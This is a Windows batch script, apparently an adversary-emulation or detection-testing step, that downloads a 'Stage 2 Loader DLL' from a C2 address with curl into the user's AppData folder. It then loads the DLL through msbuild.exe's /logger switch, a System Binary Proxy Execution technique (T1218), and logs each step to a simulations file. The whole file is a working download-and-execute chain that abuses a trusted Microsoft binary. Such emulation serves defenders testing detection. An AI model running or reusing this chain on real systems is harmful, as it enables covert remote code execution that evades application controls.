@echo off
setlocal enabledelayedexpansion

REM Placeholder constant declarations (random-named SET vars, one per PHR_*)
SET xYzAbC1=%APPDATA%\11584\aa13ba80
SET dEfGhI2=a755f35d.txt
SET jKlMnO3=https://10.0.0.49/stage/2/icon.png?11584-7
SET pQrStU4=ITZEL-S2B
SET vWxYzA5=11584
SET bCdEfG6=7
SET hIjKlM7=%PUBLIC%\\macula-simulations.log

REM Cache timestamp for debug logging
SET tsvar=!DATE!/!TIME!

REM Debug: heartbeat_start
echo [!tsvar!][DEBUG][!pQrStU4!][!vWxYzA5!]: heartbeat_start>> "!hIjKlM7!" 2>nul

REM Heartbeat fetch — download Stage 2 Loader DLL from C2
curl -k -s -o "!xYzAbC1!\!dEfGhI2!" "!jKlMnO3!"

REM Debug: heartbeat_complete (result 0 = success, 1 = failure)
if exist "!xYzAbC1!\!dEfGhI2!" (
    echo [!tsvar!][DEBUG][!pQrStU4!][!vWxYzA5!]: heartbeat_complete=0>> "!hIjKlM7!" 2>nul
) else (
    echo [!tsvar!][DEBUG][!pQrStU4!][!vWxYzA5!]: heartbeat_complete=1>> "!hIjKlM7!" 2>nul
)

REM Debug: chdir_start
echo [!tsvar!][DEBUG][!pQrStU4!][!vWxYzA5!]: chdir_start>> "!hIjKlM7!" 2>nul

REM Position working directory to output directory
cd /d "!xYzAbC1!" >nul 2>&1

REM Debug: chdir_result (errorlevel)
echo [!tsvar!][DEBUG][!pQrStU4!][!vWxYzA5!]: chdir_result=!errorlevel!>> "!hIjKlM7!" 2>nul

REM Create .proj file for msbuild ILogger pattern
echo ^<Project/^> > "!xYzAbC1!\build.proj"

REM Debug: proj_created
echo [!tsvar!][DEBUG][!pQrStU4!][!vWxYzA5!]: proj_created>> "!hIjKlM7!" 2>nul

REM Invoke msbuild via /logger: switch — loads Stage 2 DLL as ILogger
%SystemRoot%\Microsoft.NET\Framework64\v4.0.30319\msbuild.exe "!xYzAbC1!\build.proj" /logger:LoggerEntry,"!xYzAbC1!\!dEfGhI2!";MyParameters,Foo >NUL 2>&1

set msbuild_error=!errorlevel!

REM Debug: msbuild_invoke
echo [!tsvar!][DEBUG][!pQrStU4!][!vWxYzA5!]: msbuild_invoke=!msbuild_error!>> "!hIjKlM7!" 2>nul

REM Generate timestamp with millisecond precision for TTP log
for /f "delims=" %%t in ('powershell -nop -c "Get-Date -Format 'yyyy-MM-dd HH:mm:ss.fff'"') do set timestamp=%%t

REM TTP log line (T1218^|System Binary Proxy Execution) — conditional on msbuild exit code
if !msbuild_error! EQU 0 (
    echo [!timestamp!][TTP][!pQrStU4!][!vWxYzA5!]: T1218^|System Binary Proxy Execution=OK:>> "!hIjKlM7!" 2>&1
) else (
    echo [!timestamp!][TTP][!pQrStU4!][!vWxYzA5!]: T1218^|System Binary Proxy Execution=FAIL:error_code_!msbuild_error!>> "!hIjKlM7!" 2>&1
)

REM Debug: log_complete
echo [!tsvar!][DEBUG][!pQrStU4!][!vWxYzA5!]: log_complete>> "!hIjKlM7!" 2>nul

endlocal